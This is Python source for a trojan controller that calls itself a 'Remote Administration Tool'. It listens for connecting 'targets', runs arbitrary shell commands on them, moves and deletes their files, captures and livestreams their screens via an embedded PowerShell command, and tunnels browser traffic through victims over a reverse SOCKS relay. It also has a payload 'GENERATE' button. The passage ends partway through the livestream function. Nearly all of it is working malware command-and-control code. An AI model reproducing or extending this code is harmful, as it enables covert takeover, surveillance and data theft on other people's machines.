#!/usr/bin/env python3
"""
RAT - Remote Administration Tool
Based on proven server.py architecture with ALL features
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
import socket
import threading
import json
import os
import subprocess
import platform
import time
import uuid
import base64
import io
from datetime import datetime

try:
    from PIL import Image, ImageTk
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

# Colors
class Colors:
    BG = "#0d1117"
    SURFACE = "#161b22"
    BORDER = "#30363d"
    PRIMARY = "#58a6ff"
    SUCCESS = "#3fb950"
    WARNING = "#f85149"
    TEXT = "#f0f6fc"
    MUTED = "#7d8590"

class ReverseSocksRelay:
    """Reverse SOCKS5 Relay Server (based on tsocks)"""
    
    def __init__(self, cmd_port=8001, client_port=8002):
        self.cmd_port = cmd_port
        self.client_port = client_port
        self.running = False
        self.sock_s = None
        self.sock_c = None
        self.con_cmd = None
        
    def start(self):
        """Start relay server"""
        try:
            # Socket for RDP reverse connection
            self.sock_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock_s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock_s.bind(("0.0.0.0", self.cmd_port))
            self.sock_s.listen(100)
            
            # Socket for Chrome connections
            self.sock_c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock_c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock_c.bind(("0.0.0.0", self.client_port))
            self.sock_c.listen(100)
            
            self.running = True
            threading.Thread(target=self.relay_loop, daemon=True).start()
            return True
        except Exception as e:
            return False
    
    def relay_loop(self):
        """Main relay loop"""
        import select
        import struct
        
        inputs = [self.sock_s, self.sock_c]
        first_con = True
        
        while self.running:
            try:
                rs, ws, es = select.select(inputs, [], [], 1)
                
                if self.sock_s in rs:
                    if not self.con_cmd:
                        con_s, addr = self.sock_s.accept()
                        self.con_cmd = con_s
                        print(f"[DEBUG] RDP connected from {addr}")
                
                if self.sock_c in rs:
                    con_c, addr = self.sock_c.accept()
                    print(f"[DEBUG] Chrome connected from {addr}")
                    
                    if self.con_cmd:
                        print("[DEBUG] Sending 'ok' to RDP...")
                        self.con_cmd.send(b"ok")
                        print("[DEBUG] Waiting for RDP tunnel socket...")
                        con_s_tun, tun_addr = self.sock_s.accept()
                        print(f"[DEBUG] RDP tunnel socket from {tun_addr}")
                        threading.Thread(target=self.forward_data, 
                                       args=(con_s_tun, con_c), daemon=True).start()
                    else:
                        print("[DEBUG] ERROR: No RDP command socket!")
                        con_c.close()
            except Exception as e:
                print(f"[DEBUG] Relay loop error: {e}")
    
    def forward_data(self, s, c):
        """Forward data - EXACT tsocks_py3.py forward_translate logic"""
        import select
        print("[DEBUG] Starting data forwarding...")
        try:
            conlist = [c, s]
            while True:
                r, w, e = select.select(conlist, [], [])
                if c in r:
                    data = c.recv(4096)
                    if not data or s.send(data) <= 0:
                        c.close()
                        s.close()
                        print(f"[DEBUG] Chrome closed/error")
                        break
                    print(f"[DEBUG] Chrome→RDP: {len(data)} bytes")
                if s in r:
                    data = s.recv(4096)
                    if not data or c.send(data) <= 0:
                        s.close()
                        c.close()
                        print(f"[DEBUG] RDP closed/error")
                        break
                    print(f"[DEBUG] RDP→Chrome: {len(data)} bytes")
        except Exception as e:
            print(f"[DEBUG] Forward error: {e}")
            try:
                s.close()
            except:
                pass
            try:
                c.close()
            except:
                pass
    
    def stop(self):
        """Stop relay"""
        self.running = False
        try:
            if self.sock_s:
                self.sock_s.close()
            if self.sock_c:
                self.sock_c.close()
            if self.con_cmd:
                self.con_cmd.close()
        except:
            pass

class RATServer:
    """Server based on proven server.py architecture"""
    
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.server_socket = None
        self.sessions = {}
        self.session_counter = 0
        self.running = False
        
    def start_server(self):
        """Start listening for incoming connections"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            threading.Thread(target=self.accept_connections, daemon=True).start()
            return True
        except Exception as e:
            return str(e)
    
    def accept_connections(self):
        """Accept incoming connections from targets"""
        while self.running:
            try:
                client_socket, address = self.server_socket.accept()
                
                # Receive system info (server.py protocol)
                data = client_socket.recv(4096).decode('utf-8')
                if data:
                    system_info = json.loads(data)
                    
                    self.session_counter += 1
                    session_id = f"session_{self.session_counter}"
                    
                    self.sessions[session_id] = {
                        'socket': client_socket,
                        'address': address,
                        'info': system_info,
                        'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    }
                    
                    if hasattr(self, 'gui_callback'):
                        self.gui_callback('new_session', session_id)
                        
            except Exception as e:
                if self.running:
                    print(f"Error accepting connection: {e}")
    
    def send_command(self, session_id, command, timeout=10, large_data=False):
        """Send command to specific session (server.py protocol)"""
        if session_id not in self.sessions:
            return None
        
        try:
            sock = self.sessions[session_id]['socket']
            
            # Send command
            cmd_data = json.dumps({'cmd': command})
            sock.sendall(cmd_data.encode('utf-8') + b'\n')
            
            # Receive response
            response = b""
            sock.settimeout(timeout if not large_data else 60)
            buffer_size = 65536 if large_data else 4096
            
            while True:
                try:
                    chunk = sock.recv(buffer_size)
                    if not chunk:
                        break
                    response += chunk
                    if b'<<<END>>>' in response:
                        response = response.replace(b'<<<END>>>', b'')
                        break
                except socket.timeout:
                    break
            
            return response.decode('utf-8', errors='ignore')
            
        except Exception as e:
            return f"Error: {str(e)}"
    
    def close_session(self, session_id):
        """Close specific session"""
        if session_id in self.sessions:
            try:
                self.sessions[session_id]['socket'].close()
            except:
                pass
            del self.sessions[session_id]
    
    def stop_server(self):
        """Stop the server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        
        for session_id in list(self.sessions.keys()):
            self.close_session(session_id)

class RATGUI:
    """RAT GUI with ALL features"""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("RAT - Remote Administration Tool")
        self.root.geometry("1400x900")
        self.root.configure(bg=Colors.BG)
        
        self.server = RATServer()
        self.server.gui_callback = self.handle_server_event
        self.current_session = None
        self.livestream_active = False
        self.livestream_window = None
        self.terminal_windows = []  # For multi-terminal
        self.chrome_proxy = None  # Chrome proxy tunnel
        self.chrome_process = None  # Chrome process
        
        self.create_ui()
    
    def create_ui(self):
        """Create UI"""
        # Top bar
        top_frame = tk.Frame(self.root, bg=Colors.SURFACE, height=60)
        top_frame.pack(fill="x", padx=10, pady=10)
        top_frame.pack_propagate(False)
        
        tk.Label(top_frame, text="Port:", bg=Colors.SURFACE, fg=Colors.TEXT, 
                font=("Consolas", 10)).pack(side="left", padx=(10, 5))
        
        self.port_var = tk.StringVar(value="4444")
        tk.Entry(top_frame, textvariable=self.port_var, width=8, bg=Colors.BG, fg=Colors.TEXT,
                font=("Consolas", 10)).pack(side="left", padx=(0, 10))
        
        tk.Button(top_frame, text="START", command=self.start_server,
                 bg=Colors.SUCCESS, fg="white", relief="flat", font=("Consolas", 9, "bold"),
                 padx=15, pady=5).pack(side="left", padx=5)
        
        tk.Button(top_frame, text="STOP", command=self.stop_server,
                 bg=Colors.WARNING, fg="white", relief="flat", font=("Consolas", 9, "bold"),
                 padx=15, pady=5).pack(side="left", padx=5)
        
        tk.Button(top_frame, text="GENERATE", command=self.generate_payload,
                 bg=Colors.PRIMARY, fg="white", relief="flat", font=("Consolas", 9, "bold"),
                 padx=15, pady=5).pack(side="left", padx=5)
        
        self.status_label = tk.Label(top_frame, text="OFFLINE", bg=Colors.SURFACE, 
                                     fg=Colors.WARNING, font=("Consolas", 10, "bold"))
        self.status_label.pack(side="right", padx=10)
        
        # Main content
        content = tk.Frame(self.root, bg=Colors.BG)
        content.pack(fill="both", expand=True, padx=10, pady=(0, 10))
        
        # Left: Sessions
        left = tk.Frame(content, bg=Colors.SURFACE, width=350)
        left.pack(side="left", fill="y", padx=(0, 5))
        left.pack_propagate(False)
        
        tk.Label(left, text="SESSIONS", bg=Colors.SURFACE, fg=Colors.PRIMARY,
                font=("Consolas", 11, "bold")).pack(pady=10)
        
        # Session buttons
        btn_frame = tk.Frame(left, bg=Colors.SURFACE)
        btn_frame.pack(fill="x", padx=10, pady=5)
        
        tk.Button(btn_frame, text="REFRESH", command=self.refresh_sessions,
                 bg=Colors.PRIMARY, fg="white", relief="flat", font=("Consolas", 8),
                 padx=10).pack(side="left", padx=2)
        
        tk.Button(btn_frame, text="DELETE", command=self.delete_session,
                 bg=Colors.WARNING, fg="white", relief="flat", font=("Consolas", 8),
                 padx=10).pack(side="left", padx=2)
        
        # Second row buttons
        btn_frame2 = tk.Frame(left, bg=Colors.SURFACE)
        btn_frame2.pack(fill="x", padx=10, pady=5)
        
        tk.Button(btn_frame2, text="📷", command=self.take_screenshot,
                 bg="#e67e22", fg="white", relief="flat", font=("Consolas", 10),
                 width=3).pack(side="left", padx=2)
        
        self.live_btn = tk.Button(btn_frame2, text="▶", command=self.toggle_livestream,
                                  bg="#9b59b6", fg="white", relief="flat", font=("Consolas", 10),
                                  width=3)
        self.live_btn.pack(side="left", padx=2)
        
        tk.Button(btn_frame2, text="📁", command=self.open_file_manager,
                 bg="#3498db", fg="white", relief="flat", font=("Consolas", 10),
                 width=3).pack(side="left", padx=2)
        
        tk.Button(btn_frame2, text="+TERM", command=self.new_terminal,
                 bg="#27ae60", fg="white", relief="flat", font=("Consolas", 8),
                 padx=8).pack(side="left", padx=2)
        
        tk.Button(btn_frame2, text="🌐", command=self.launch_chrome_proxy,
                 bg="#ff6b6b", fg="white", relief="flat", font=("Consolas", 10),
                 width=3, cursor="hand2").pack(side="left", padx=2)
        
        # Sessions list
        self.sessions_tree = ttk.Treeview(left, columns=("os", "ip", "user"), 
                                         show="tree headings", height=25)
        self.sessions_tree.heading("#0", text="ID")
        self.sessions_tree.heading("os", text="OS")
        self.sessions_tree.heading("ip", text="IP")
        self.sessions_tree.heading("user", text="User")
        self.sessions_tree.column("#0", width=100)
        self.sessions_tree.column("os", width=70)
        self.sessions_tree.column("ip", width=100)
        self.sessions_tree.column("user", width=80)
        self.sessions_tree.pack(fill="both", expand=True, padx=10, pady=10)
        self.sessions_tree.bind('<<TreeviewSelect>>', self.on_session_select)
        
        # Right: Terminal
        right = tk.Frame(content, bg=Colors.SURFACE)
        right.pack(side="right", fill="both", expand=True)
        
        tk.Label(right, text="TERMINAL", bg=Colors.SURFACE, fg=Colors.PRIMARY,
                font=("Consolas", 11, "bold")).pack(pady=10)
        
        self.terminal = scrolledtext.ScrolledText(right, bg=Colors.BG, fg=Colors.TEXT,
                                                  font=("Consolas", 9), relief="flat",
                                                  insertbackground=Colors.PRIMARY,
                                                  wrap="word")
        self.terminal.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Command input
        cmd_frame = tk.Frame(right, bg=Colors.SURFACE)
        cmd_frame.pack(fill="x", padx=10, pady=(0, 10))
        
        tk.Label(cmd_frame, text="$", bg=Colors.SURFACE, fg=Colors.PRIMARY,
                font=("Consolas", 11, "bold")).pack(side="left", padx=(0, 5))
        
        self.cmd_var = tk.StringVar()
        self.cmd_entry = tk.Entry(cmd_frame, textvariable=self.cmd_var, bg=Colors.BG, 
                                  fg=Colors.TEXT, font=("Consolas", 10), relief="flat",
                                  insertbackground=Colors.PRIMARY)
        self.cmd_entry.pack(side="left", fill="x", expand=True)
        self.cmd_entry.bind("<Return>", self.send_command)
    
    def log(self, message, level="INFO"):
        """Log to terminal"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if level == "ERROR":
            prefix = "[ERROR]"
        elif level == "SUCCESS":
            prefix = "[✓]"
        else:
            prefix = "[*]"
        
        self.terminal.insert("end", f"[{timestamp}] {prefix} {message}\n")
        self.terminal.see("end")
    
    def start_server(self):
        """Start server"""
        try:
            port = int(self.port_var.get())
            self.server.port = port
            result = self.server.start_server()
            if result is True:
                self.status_label.config(text="ONLINE", fg=Colors.SUCCESS)
                self.log(f"Server started on port {port}", "SUCCESS")
            else:
                self.log(f"Failed to start: {result}", "ERROR")
        except Exception as e:
            self.log(f"Error: {e}", "ERROR")
    
    def stop_server(self):
        """Stop server"""
        self.server.stop_server()
        self.status_label.config(text="OFFLINE", fg=Colors.WARNING)
        self.log("Server stopped")
    
    def handle_server_event(self, event_type, session_id):
        """Handle server events"""
        if event_type == 'new_session':
            self.root.after(0, lambda: self.log(f"New session: {session_id}", "SUCCESS"))
            self.root.after(100, self.refresh_sessions)
    
    def refresh_sessions(self):
        """Refresh session list"""
        self.sessions_tree.delete(*self.sessions_tree.get_children())
        for sid, info in self.server.sessions.items():
            sys_info = info['info']
            self.sessions_tree.insert("", "end", text=sid,
                                     values=(sys_info.get('os', 'Unknown'),
                                            info['address'][0],
                                            sys_info.get('username', 'Unknown')))
    
    def on_session_select(self, event):
        """Session selected"""
        selection = self.sessions_tree.selection()
        if selection:
            self.current_session = self.sessions_tree.item(selection[0])['text']
            info = self.server.sessions[self.current_session]['info']
            self.log(f"Selected: {self.current_session} ({info.get('username')}@{info.get('hostname')})")
    
    def delete_session(self):
        """Delete session"""
        if not self.current_session:
            self.log("No session selected", "ERROR")
            return
        
        self.server.close_session(self.current_session)
        self.current_session = None
        self.refresh_sessions()
        self.log("Session deleted")
    
    def send_command(self, event=None):
        """Send command"""
        if not self.current_session:
            self.log("No session selected", "ERROR")
            return
        
        cmd = self.cmd_var.get().strip()
        if not cmd:
            return
        
        self.cmd_var.set("")
        self.log(f"$ {cmd}")
        
        threading.Thread(target=self._execute_command, args=(cmd,), daemon=True).start()
    
    def _execute_command(self, cmd):
        """Execute command"""
        result = self.server.send_command(self.current_session, cmd, timeout=30)
        if result:
            self.root.after(0, lambda: self.log(result.strip()))
    
    def new_terminal(self):
        """Open new INDEPENDENT terminal window"""
        if not self.current_session:
            self.log("No session selected", "ERROR")
            return
        
        # Count terminals for this session
        term_num = len(self.terminal_windows) + 1
        
        term_win = tk.Toplevel(self.root)
        term_win.title(f"Terminal #{term_num} - {self.current_session}")
        term_win.geometry("900x600")
        term_win.configure(bg=Colors.BG)
        
        # Store session ID and INDEPENDENT directory for this terminal
        term_win.session_id = self.current_session
        term_win.terminal_id = f"term_{term_num}_{int(time.time())}"
        term_win.current_dir = None  # Will be set after first command
        
        # Top bar with terminal info
        top_bar = tk.Frame(term_win, bg=Colors.SURFACE, height=35)
        top_bar.pack(fill="x")
        top_bar.pack_propagate(False)
        
        tk.Label(top_bar, text=f"🖥 Terminal #{term_num}", bg=Colors.SURFACE, fg=Colors.PRIMARY,
                font=("Consolas", 10, "bold")).pack(side="left", padx=10)
        
        tk.Label(top_bar, text=f"Session: {self.current_session}", bg=Colors.SURFACE, fg=Colors.MUTED,
                font=("Consolas", 9)).pack(side="left", padx=10)
        
        # Directory indicator (updates dynamically)
        dir_label = tk.Label(top_bar, text="📁 Detecting...", bg=Colors.SURFACE, fg="#3498db",
                            font=("Consolas", 8))
        dir_label.pack(side="left", padx=10)
        
        # Update directory display
        def update_dir_display():
            if term_win.winfo_exists() and term_win.current_dir:
                dir_label.config(text=f"📁 {term_win.current_dir}")
            term_win.after(1000, update_dir_display)
        
        term_win.after(1000, update_dir_display)
        
        tk.Button(top_bar, text="🗑 CLEAR", command=lambda: terminal.delete(1.0, "end"),
                 bg=Colors.WARNING, fg="white", relief="flat", font=("Consolas", 8),
                 padx=10).pack(side="right", padx=5)
        
        # Terminal output - INDEPENDENT for this window
        terminal = scrolledtext.ScrolledText(term_win, bg=Colors.BG, fg=Colors.TEXT,
                                            font=("Consolas", 9), relief="flat",
                                            insertbackground=Colors.PRIMARY, wrap="word")
        terminal.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Show welcome message
        terminal.insert("end", f"╔════════════════════════════════════════╗\n")
        terminal.insert("end", f"║   NEW TERMINAL SESSION #{term_num}            ║\n")
        terminal.insert("end", f"║   Session: {self.current_session}                ║\n")
        terminal.insert("end", f"║   Independent command execution       ║\n")
        terminal.insert("end", f"╚════════════════════════════════════════╝\n\n")
        
        # Command input
        cmd_frame = tk.Frame(term_win, bg=Colors.SURFACE)
        cmd_frame.pack(fill="x", padx=10, pady=(0, 10))
        
        tk.Label(cmd_frame, text="$", bg=Colors.SURFACE, fg=Colors.PRIMARY,
                font=("Consolas", 11, "bold")).pack(side="left", padx=(0, 5))
        
        cmd_var = tk.StringVar()
        cmd_entry = tk.Entry(cmd_frame, textvariable=cmd_var, bg=Colors.BG, 
                            fg=Colors.TEXT, font=("Consolas", 10), relief="flat",
                            insertbackground=Colors.PRIMARY)
        cmd_entry.pack(side="left", fill="x", expand=True)
        
        # Command history for THIS terminal only
        cmd_history = []
        history_index = [0]
        
        def send_cmd(event=None):
            cmd = cmd_var.get().strip()
            if not cmd:
                return
            
            # Add to this terminal's history
            cmd_history.append(cmd)
            history_index[0] = len(cmd_history)
            
            cmd_var.set("")
            timestamp = datetime.now().strftime("%H:%M:%S")
            terminal.insert("end", f"[{timestamp}] $ {cmd}\n", "command")
            terminal.tag_config("command", foreground=Colors.PRIMARY)
            terminal.see("end")
            
            # Execute command INDEPENDENTLY - payload handles separation
            def exec_cmd():
                # Check if terminal still exists
                if not term_win.winfo_exists():
                    return
                
                # Send command with terminal ID prefix
                prefixed_cmd = f"TERMID:{term_win.terminal_id}:{cmd}"
                result = self.server.send_command(term_win.session_id, prefixed_cmd, timeout=30)
                
                # Update current_dir display from result
                if result and "Changed to:" in result:
                    try:
                        term_win.current_dir = result.split("Changed to:")[1].strip().split("\n")[0]
                    except:
                        pass
                elif not term_win.current_dir and result and "Directory of " in result:
                    try:
                        term_win.current_dir = result.split("Directory of ")[1].split("\n")[0].strip()
                    except:
                        pass
                
                if result and term_win.winfo_exists():
                    term_win.after(0, lambda: terminal.insert("end", result.strip() + "\n", "output"))
                    term_win.after(0, lambda: terminal.tag_config("output", foreground=Colors.TEXT))
                    term_win.after(0, lambda: terminal.see("end"))
            
            threading.Thread(target=exec_cmd, daemon=True).start()
        
        def on_up_arrow(event):
            if cmd_history and history_index[0] > 0:
                history_index[0] -= 1
                cmd_var.set(cmd_history[history_index[0]])
                cmd_entry.icursor("end")
                return "break"
        
        def on_down_arrow(event):
            if cmd_history and history_index[0] < len(cmd_history) - 1:
                history_index[0] += 1
                cmd_var.set(cmd_history[history_index[0]])
                cmd_entry.icursor("end")
            elif history_index[0] == len(cmd_history) - 1:
                history_index[0] = len(cmd_history)
                cmd_var.set("")
            return "break"
        
        cmd_entry.bind("<Return>", send_cmd)
        cmd_entry.bind("<Up>", on_up_arrow)
        cmd_entry.bind("<Down>", on_down_arrow)
        cmd_entry.focus()
        
        # Clean up on close
        def on_close():
            if term_win in self.terminal_windows:
                self.terminal_windows.remove(term_win)
            term_win.destroy()
        
        term_win.protocol("WM_DELETE_WINDOW", on_close)
        
        self.terminal_windows.append(term_win)
        self.log(f"New independent terminal #{term_num} opened for {self.current_session}")
    
    def open_file_manager(self):
        """Open file manager"""
        if not self.current_session:
            self.log("No session selected", "ERROR")
            return
        
        fm_win = tk.Toplevel(self.root)
        fm_win.title(f"File Manager - {self.current_session}")
        fm_win.geometry("1200x700")
        fm_win.configure(bg="#ffffff")
        
        # Top bar
        top_bar = tk.Frame(fm_win, bg="#f8f9fa", height=50)
        top_bar.pack(fill="x")
        top_bar.pack_propagate(False)
        
        tk.Label(top_bar, text="File Manager", bg="#f8f9fa", fg="#2c3e50",
                font=("Segoe UI", 12, "bold")).pack(side="left", padx=15, pady=10)
        
        tk.Button(top_bar, text="↻ Refresh", command=lambda: self._refresh_file_manager(fm_win),
                 bg="#3498db", fg="white", relief="flat", font=("Segoe UI", 9),
                 padx=15, pady=5).pack(side="right", padx=5)
        
        # Main content
        content = tk.Frame(fm_win, bg="#ffffff")
        content.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Local files (left)
        local_frame = tk.Frame(content, bg="#ffffff")
        local_frame.pack(side="left", fill="both", expand=True, padx=(0, 5))
        
        tk.Label(local_frame, text="📁 Local Files", bg="#ffffff", fg="#2c3e50",
                font=("Segoe UI", 10, "bold")).pack(pady=5)
        
        local_tree = ttk.Treeview(local_frame, columns=("size", "modified"), 
                                 show="tree headings", height=25)
        local_tree.heading("#0", text="Name")
        local_tree.heading("size", text="Size")
        local_tree.heading("modified", text="Modified")
        local_tree.column("#0", width=250)
        local_tree.column("size", width=100)
        local_tree.column("modified", width=150)
        local_tree.pack(fill="both", expand=True)
        
        # Middle buttons
        mid_frame = tk.Frame(content, bg="#ffffff", width=80)
        mid_frame.pack(side="left", fill="y", padx=10)
        mid_frame.pack_propagate(False)
        
        tk.Label(mid_frame, text="", bg="#ffffff").pack(pady=50)
        
        tk.Button(mid_frame, text="➡\nUPLOAD", 
                 command=lambda: self._file_upload(local_tree, remote_tree, fm_win),
                 bg="#27ae60", fg="white", relief="flat", font=("Segoe UI", 9, "bold"),
                 padx=10, pady=15, width=8).pack(pady=10)
        
        tk.Button(mid_frame, text="⬅\nDOWNLOAD",
                 command=lambda: self._file_download(remote_tree, local_tree, fm_win),
                 bg="#2980b9", fg="white", relief="flat", font=("Segoe UI", 9, "bold"),
                 padx=10, pady=15, width=8).pack(pady=10)
        
        tk.Button(mid_frame, text="🗑\nDELETE",
                 command=lambda: self._file_delete(remote_tree, fm_win),
                 bg="#e74c3c", fg="white", relief="flat", font=("Segoe UI", 9, "bold"),
                 padx=10, pady=15, width=8).pack(pady=10)
        
        # Remote files (right)
        remote_frame = tk.Frame(content, bg="#ffffff")
        remote_frame.pack(side="right", fill="both", expand=True, padx=(5, 0))
        
        tk.Label(remote_frame, text="🖥 Remote Files", bg="#ffffff", fg="#2c3e50",
                font=("Segoe UI", 10, "bold")).pack(pady=5)
        
        remote_tree = ttk.Treeview(remote_frame, columns=("size", "modified"), 
                                  show="tree headings", height=25)
        remote_tree.heading("#0", text="Name")
        remote_tree.heading("size", text="Size")
        remote_tree.heading("modified", text="Modified")
        remote_tree.column("#0", width=250)
        remote_tree.column("size", width=100)
        remote_tree.column("modified", width=150)
        remote_tree.pack(fill="both", expand=True)
        
        # Status bar
        status_bar = tk.Frame(fm_win, bg="#f8f9fa", height=30)
        status_bar.pack(fill="x", side="bottom")
        status_bar.pack_propagate(False)
        
        status_label = tk.Label(status_bar, text="Ready", bg="#f8f9fa", fg="#7f8c8d",
                               font=("Segoe UI", 9), anchor="w")
        status_label.pack(fill="x", padx=10, pady=5)
        
        # Store references
        fm_win.local_tree = local_tree
        fm_win.remote_tree = remote_tree
        fm_win.status_label = status_label
        
        # Initial load
        self._refresh_file_manager(fm_win)
        
        self.log("File manager opened")
    
    def _refresh_file_manager(self, fm_win):
        """Refresh file manager"""
        # Load local files
        fm_win.local_tree.delete(*fm_win.local_tree.get_children())
        try:
            for item in os.listdir('.'):
                path = os.path.join('.', item)
                if os.path.isfile(path):
                    size = os.path.getsize(path)
                    mtime = datetime.fromtimestamp(os.path.getmtime(path)).strftime("%Y-%m-%d %H:%M")
                    fm_win.local_tree.insert("", "end", text=item, 
                                            values=(f"{size} B", mtime))
        except Exception as e:
            pass
        
        # Load remote files
        fm_win.remote_tree.delete(*fm_win.remote_tree.get_children())
        
        def load_remote():
            result = self.server.send_command(self.current_session, "LISTDIR", timeout=10)
            if result:
                try:
                    files = json.loads(result)
                    for f in files:
                        fm_win.after(0, lambda f=f: fm_win.remote_tree.insert("", "end", text=f['name'],
                                                                              values=(f['size'], f['modified'])))
                except:
                    pass
        
        threading.Thread(target=load_remote, daemon=True).start()
        fm_win.status_label.config(text="Refreshed")
    
    def _file_upload(self, local_tree, remote_tree, fm_win):
        """Upload file"""
        selection = local_tree.selection()
        if not selection:
            fm_win.status_label.config(text="No file selected")
            return
        
        filename = local_tree.item(selection[0])['text']
        
        def upload():
            try:
                with open(filename, 'rb') as f:
                    data = base64.b64encode(f.read()).decode('utf-8')
                
                cmd = f"UPLOAD:{filename}:{data}"
                result = self.server.send_command(self.current_session, cmd, timeout=60, large_data=True)
                
                fm_win.after(0, lambda: fm_win.status_label.config(text=f"Uploaded: {filename}"))
                fm_win.after(100, lambda: self._refresh_file_manager(fm_win))
            except Exception as e:
                fm_win.after(0, lambda: fm_win.status_label.config(text=f"Upload failed: {e}"))
        
        threading.Thread(target=upload, daemon=True).start()
        fm_win.status_label.config(text=f"Uploading {filename}...")
    
    def _file_download(self, remote_tree, local_tree, fm_win):
        """Download file"""
        selection = remote_tree.selection()
        if not selection:
            fm_win.status_label.config(text="No file selected")
            return
        
        filename = remote_tree.item(selection[0])['text']
        
        def download():
            try:
                cmd = f"DOWNLOAD:{filename}"
                result = self.server.send_command(self.current_session, cmd, timeout=60, large_data=True)
                
                if result and ':' in result:
                    _, data = result.split(':', 1)
                    
                    # Fix padding
                    data = data.strip()
                    padding = len(data) % 4
                    if padding:
                        data += '=' * (4 - padding)
                    
                    file_data = base64.b64decode(data)
                    
                    with open(filename, 'wb') as f:
                        f.write(file_data)
                    
                    fm_win.after(0, lambda: fm_win.status_label.config(text=f"Downloaded: {filename}"))
                    fm_win.after(100, lambda: self._refresh_file_manager(fm_win))
                else:
                    fm_win.after(0, lambda: fm_win.status_label.config(text="Download failed"))
                    
            except Exception as e:
                fm_win.after(0, lambda: fm_win.status_label.config(text=f"Download failed: {e}"))
        
        threading.Thread(target=download, daemon=True).start()
        fm_win.status_label.config(text=f"Downloading {filename}...")
    
    def _file_delete(self, remote_tree, fm_win):
        """Delete remote file"""
        selection = remote_tree.selection()
        if not selection:
            fm_win.status_label.config(text="No file selected")
            return
        
        filename = remote_tree.item(selection[0])['text']
        
        def delete():
            cmd = f"DELETE:{filename}"
            result = self.server.send_command(self.current_session, cmd, timeout=10)
            
            fm_win.after(0, lambda: fm_win.status_label.config(text=f"Deleted: {filename}"))
            fm_win.after(100, lambda: self._refresh_file_manager(fm_win))
        
        threading.Thread(target=delete, daemon=True).start()
        fm_win.status_label.config(text=f"Deleting {filename}...")
    
    def take_screenshot(self):
        """Take screenshot"""
        if not self.current_session:
            self.log("No session selected", "ERROR")
            return
        
        self.log("Taking screenshot...")
        threading.Thread(target=self._do_screenshot, daemon=True).start()
    
    def _do_screenshot(self):
        """Execute screenshot"""
        ps_cmd = 'powershell -Command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $screens = [Windows.Forms.Screen]::AllScreens; $bounds = $screens[0].Bounds; $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size); $ms = New-Object IO.MemoryStream; $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg); [Convert]::ToBase64String($ms.ToArray())"'
        
        result = self.server.send_command(self.current_session, ps_cmd, timeout=30, large_data=True)
        
        if result and len(result) > 100:
            try:
                # Fix padding
                result = result.strip()
                padding = len(result) % 4
                if padding:
                    result += '=' * (4 - padding)
                
                img_data = base64.b64decode(result)
                filename = f"screenshot_{self.current_session}_{int(time.time())}.jpg"
                
                with open(filename, 'wb') as f:
                    f.write(img_data)
                
                self.root.after(0, lambda: self.log(f"Screenshot saved: {filename}", "SUCCESS"))
                
                if PIL_AVAILABLE:
                    image = Image.open(io.BytesIO(img_data))
                    self.root.after(0, lambda: self._show_image(image, "Screenshot"))
                    
            except Exception as e:
                self.root.after(0, lambda: self.log(f"Screenshot failed: {e}", "ERROR"))
        else:
            self.root.after(0, lambda: self.log("Screenshot failed: No data", "ERROR"))
    
    def toggle_livestream(self):
        """Toggle livestream"""
        if not self.current_session:
            self.log("No session selected", "ERROR")
            return
        
        if not self.livestream_active:
            self.livestream_active = True
            self.live_btn.config(text="⏸", bg="#e74c3c")
            self.log("Livestream started", "SUCCESS")
            self._create_livestream_window()
            self._livestream_loop()
        else:
            self.livestream_active = False
            self.live_btn.config(text="▶", bg="#9b59b6")
            self.log("Livestream stopped")
            if self.livestream_window:
                self.livestream_window.destroy()
                self.livestream_window = None
    
    def _create_livestream_window(self):
        """Create livestream window"""
        if self.livestream_window:
            return
        
        self.livestream_window = tk.Toplevel(self.root)
        self.livestream_window.title("Live Stream")
        self.livestream_window.geometry("1000x700")
        self.livestream_window.configure(bg=Colors.BG)
        self.livestream_window.protocol("WM_DELETE_WINDOW", self.toggle_livestream)
        
        self.livestream_label = tk.Label(self.livestream_window, bg=Colors.BG)
        self.livestream_label.pack(expand=True)
    
    def _livestream_loop(self):
        """Livestream loop"""
        if not self.livestream_active:
            return
        
        threading.Thread(target=self._capture_livestream_frame, daemon=True).start()
        self.root.after(1000, self._livestream_loop)
    
    def _capture_livestream_frame(self):
        """Capture livestream frame"""
        ps_cmd = 'powershell -Command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $screens = [Windows.Forms.Screen]::AllScreens; $bounds = $screens[0].Bounds; $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size); $ms = New-Object IO.MemoryStream; $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg); [Convert]::ToBase64String($ms.ToArray())"'
        
        result = self.server.send_command(self.current_session, ps_cmd, timeout=30, large_data=True)
        
        if result and len(result) > 100 and PIL_AVAILABLE and self.livestream_window:
            try:
                # Fix padding
                result = result.strip()
                padding = len(result) % 4
                if padding:
                    result += '=' * (4 - padding)
                
                img_data = base64.b64decode(result)
                image = Image.open(io.BytesIO(img_data))
                
                # Resize to fit
                max_w, max_h = 980, 680
                img_w, img_h = image.size
                if img_w > max_w or img_h > max_h:
